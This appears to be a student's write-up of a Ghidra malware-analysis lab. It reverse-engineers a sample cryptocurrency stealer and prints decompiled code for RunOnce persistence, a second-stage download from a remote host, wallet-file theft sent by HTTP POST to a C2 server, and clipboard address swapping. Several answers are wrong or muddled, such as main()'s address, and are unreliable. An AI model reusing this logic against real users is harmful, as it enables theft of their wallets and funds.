## Ghidra Lab

 ndefined4 main(void)

```
{
  HRESULT HVar1;
  BYTE local_8414 [32768];
  BYTE local_414 [1024];
  DWORD local_14;
  DWORD local_10;
  HKEY Run_Once_handle;
  int local_8;
  
  local_8 = 0x40154d;
  local_10 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_414,0x400);
  RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_004131ec,&Run_Once_handl e);
  RegSetValueExA(Run_Once_handle,s_SysReqClient_00413220,0,1,local_414,local_10);
  RegCloseKey(Run_Once_handle);
  local_14 = ExpandEnvironmentStringsA(s_%TEMP%\srcupdate.exe_00413230,(LPSTR)local_8414,0x8000);
  HVar1 = URLDownloadToFileA((LPUNKNOWN)0x0,s_http://crimestaging.mandiant.com_00413248,
                             (LPCSTR)local_8414,0,(LPBINDSTATUSCALLBACK)0x0);

    HRESULT URLDownloadToFile(
             LPUNKNOWN            pCaller,
             LPCTSTR              szURL,
             LPCTSTR              szFileName,
  _Reserved_ DWORD                dwReserved,
             LPBINDSTATUSCALLBACK lpfnCB
);




  if (HVar1 == 0) {
    RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_00413284,&Run_Once_han dle
               );
    RegSetValueExA(Run_Once_handle,s_SysReqUpdt_004132b8,0,1,local_8414,local_14);

    RegCloseKey(Run_Once_handle);
  }
  FUN_00401290();
  FUN_00401000(PTR_DAT_004131cc,PTR_DAT_004131d0,PTR_DAT_004131d4);
  FUN_00401000(PTR_DAT_004131d8,PTR_DAT_004131dc,PTR_DAT_004131e0);
  FUN_00401290();
  FUN_00401490();
  FUN_00401230();

  for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
    FUN_00401000((&PTR_DAT_0041319c)[local_8 * 3],(&PTR_DAT_004131a4)[local_8 * 3],
                 
                 (&PTR_DAT_004131a0)[local_8 * 3]);
  }
  return 0;
}
After cleaning we can get this.  local_10 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_414,0x400);
  RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_004131ec,&Run_Once_handl e);
  RegSetValueExA(Run_Once_handle,s_SysReqClient_00413220,0,REG_SZ,local_414,local_10);
  RegCloseKey(Run_Once_handle);
  totalchar_env_str =
       ExpandEnvironmentStringsA(s_%TEMP%\srcupdate.exe_00413230,(LPSTR)downloaded_env_str,0x8000 );
  HVar1 = URLDownloadToFileA((LPUNKNOWN)0x0,s_http://crimestaging.mandiant.com_00413248,
                             (LPCSTR)downloaded_env_str,0,(LPBINDSTATUSCALLBACK)0x0);
  if (HVar1 == 0) {
    RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_00413284,&Run_Once_han dle
               );
    RegSetValueExA(Run_Once_handle,s_SysReqUpdt_004132b8,0,REG_SZ,downloaded_env_str,
                   totalchar_env_str);
    RegCloseKey(Run_Once_handle);
  }

  local_10 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_414,0x400);
  RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_004131ec,&Run_Once_handl e);
  RegSetValueExA(Run_Once_handle,s_SysReqClient_00413220,0,REG_SZ,local_414,local_10);
  RegCloseKey(Run_Once_handle);
  totalchar_env_str =
       ExpandEnvironmentStringsA(s_%TEMP%\srcupdate.exe_00413230,(LPSTR)downloaded_env_str,0x8000 );
  HVar1 = URLDownloadToFileA((LPUNKNOWN)0x0,s_http://crimestaging.mandiant.com_00413248,
                             (LPCSTR)downloaded_env_str,0,(LPBINDSTATUSCALLBACK)0x0);
  if (HVar1 == 0) {
    RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_00413284,&Run_Once_han dle
               );
    RegSetValueExA(Run_Once_handle,s_SysReqUpdt_004132b8,0,REG_SZ,downloaded_env_str,
                   totalchar_env_str);
    RegCloseKey(Run_Once_handle);
  }
```
1. What is the address of the main() function?
The address is at 0x00413248.

2. What Registry values are being set by the main() function?
What are they being set to?

SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce is being set here. 


3. What URL is requested within the main() function and what does it do
with the response?
http://crimestaging.mandiant.com/update/srclient/update.exe is being requested. 


Reverse engineer the function at address 401290. Note that this function is called by the main() function. Do not examine function 4011F0 until directed to do so.



```

void FUN_00401290(void)

{
  FUN_004011f0(PTR_DAT_004131cc);
  FUN_004011f0(PTR_DAT_004131d0);
  FUN_004011f0(PTR_DAT_004131d4);
  FUN_004011f0(PTR_DAT_004131d8);
  FUN_004011f0(PTR_DAT_004131dc);
  FUN_004011f0(PTR_DAT_004131e0);
  return;
}

```

4. Without examining function 4011F0, describe as best you can the
overall logic of this function (401290).
This function just calls other multiple function with arguments.




5. Reverse engineer function 4011F0. What does this function do?
Decode the ASCII string data pointed to by the arguments to function 4011F0 found within function 401290. (Hint: Each array element is a pointer to a string.
This function xor encode each but from the prrovided arguments and retrurn back the byte
from hex -> xor with cc -> bitcoin
                            wallet.dat
                            %APPDATA%\Bitcoin
                            metamask
                            locals.dat
%APPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn


The first encoded string data occurs at memory address 4130C0. All the
encoded string data is contiguous, and the last encoded value is at address
413199).
PTR_DAT_004131cc

6. Describe and/or give an example of the decoded data.



Function 401000 is called twice in a row in the main{) function. It is passed three values each time, these are the same values that were decoded by the string decoding function 401290. Focus on this function until directed otherwise.
* Note: malloc() is shown as FUN_004032e6 and free{) is
shown as FUN 004032cb in this function.

7. What is param_3 (the third parameter to this function) used for?
opening a file _named  

8. What is param_2 (the second parameter to this function) used for?
Create an env variable

9. What data is read by the call to Read File()?
read %appdata%/bitcoin file

10. What does this function do with the data it reads from the file?
pass it to another function

FUN_00401110(bitcoin,malloced_addr,local_14);


Reverse engineer function 401110. This function takes three parameters: a string that describes the cryptocurrency type, a pointer to a buffer containing the data read from the wallet file, and the size of that data buffer.

11. Examine the first function called in this function. What does this function do and what data is it operating on?
iVar1 = InternetOpenA(s_Mozila/5.0_004132c4,0,0,0,0);

IInternetOpen is the first WinINet function called by an application. It tells the Internet DLL to initialize internal data structures and prepare for future calls from the application. 

12. What host does this function communicate to?
crime.mandiant.com 

13. What protocol does this function use to communicate?
http POST request

14. What data does this function send to the remote host?
username , pass is trying to be sent
Trying to send data of bitcoin file.



The main() function calls function 401490. You will not be required to reverse engineer this function. It is boilerplate code that will create a Window object and enter a loop known as a "message pump" that will transition the program from operating in a linear fashion into operating as an event-driven GUI.

The window object that is created has a callback function. This is the code that will execute when the window is loaded, even if it is a non-visible window such as this. The callback function specified in t his program is 4012f0. Focus on reverse engineering this function for t he remainder of this lab. Please refer to this MSDN article to understand the prototype and design of this function:

https ://docs.microsoft.com/en-us/windows/win32/learnwin32/writing-the-window-procedure

Note that the function will contain a Switch statement with case clauses that have constants
which begin with the prefix "WM_"

15. Based on the API functions used in function 4012FO, what data does this function appear to be reading and manipulating?
copying and manipulating the clipoard data

16. The first function called is a function that we have encountered many times during this lab, what is it and what data is it operating on? What is its result (decoded}?
hex data
this is bitcoin address 1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY 

17. What this function do? (Hint: Bitcoin wallet addresses often begin with 1 or 3 and are 34 digits long)
set clipboard data that we specified probably put bitcoin address into our clipboard -> 1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY.


Bonus (Advanced): Reverse engineer the remainder of the functionality in
main() after the call to 401490. Describe the behavior and effect of this code.

text => binance
  for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
    FUN_00401000((&PTR_DAT_0041319c)[local_8 * 3],(&PTR_DAT_004131a4)[local_8 * 3],
                 (&PTR_DAT_004131a0)[local_8 * 3]);

%APPDATA%\Binance\Local\Acctbitheraccount.db
%APPDATA%\Bither\profilesolar_walletwallet.dat
%APPDATA%\SolarÌelectrumdbx.db%APPDATA\Electrum\wallet

18. Summarize as succinctly as you can: what does this program do?
```

/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */

undefined4 main(void)

{
  HRESULT HVar1;
  BYTE downloaded_env_str [32768];
  BYTE local_414 [1024];
  DWORD totalchar_env_str;
  DWORD local_10;
  HKEY Run_Once_handle;
  int local_8;
  
  local_8 = 0x40154d;
  local_10 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_414,0x400);
  RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_004131ec,&Run_Once_handl e);
  RegSetValueExA(Run_Once_handle,s_SysReqClient_00413220,0,REG_SZ,local_414,local_10);
  RegCloseKey(Run_Once_handle);
  totalchar_env_str =
       ExpandEnvironmentStringsA(s_%TEMP%\srcupdate.exe_00413230,(LPSTR)downloaded_env_str,0x8000 );
  HVar1 = URLDownloadToFileA((LPUNKNOWN)0x0,s_http://crimestaging.mandiant.com_00413248,
                             (LPCSTR)downloaded_env_str,0,(LPBINDSTATUSCALLBACK)0x0);
  if (HVar1 == 0) {
    RegOpenKeyA((HKEY)HKEY_CURRENT_USER,s_SOFTWARE\Microsoft\Windows\Curre_00413284,&Run_Once_han dle
               );
    RegSetValueExA(Run_Once_handle,s_SysReqUpdt_004132b8,0,REG_SZ,downloaded_env_str,
                   totalchar_env_str);
    RegCloseKey(Run_Once_handle);
  }
  FUN_00401290();
  FUN_00401000(bitcoin,wallet.dat,%APPDATA%\Bitcoin);
  FUN_00401000(metamask,locals.dat,chrome_appdata);
  FUN_00401290();
  FUN_00401490();
  FUN_00401230();
  for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
    FUN_00401000((&binance)[local_8 * 3],(&coiinmgt.db)[local_8 * 3],(&path_coins)[local_8 * 3]);
  }
  return 0;
}
```
Decompiled cleaned one
This is a malware where once opened it sets a value in register and then create persistence in system using run_once_handle.
it download the file from `http://crimestaging.mandiant.com_`
and updates registry to run_once_handle with persistance . 

searches for

%APPDATA%\Binance\Local\Acctbitheraccount.db
%APPDATA%\Bither\profilesolar_walletwallet.dat
%APPDATA%\SolarÌelectrumdbx.db%APPDATA\Electrum\wallet

and if found sent it to c2 server via post request
and when listens to clipboard while changes the data for crypto adress to our predefined address.




19. List all discovered Host and Network Indicators from this malware.
Host:
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
"SysReqClient"
"%TEMP%\\srcupdate.exe"


Network indicators
"http://crimestaging.mandiant.com/update/srclient/update.exe"
http
POST

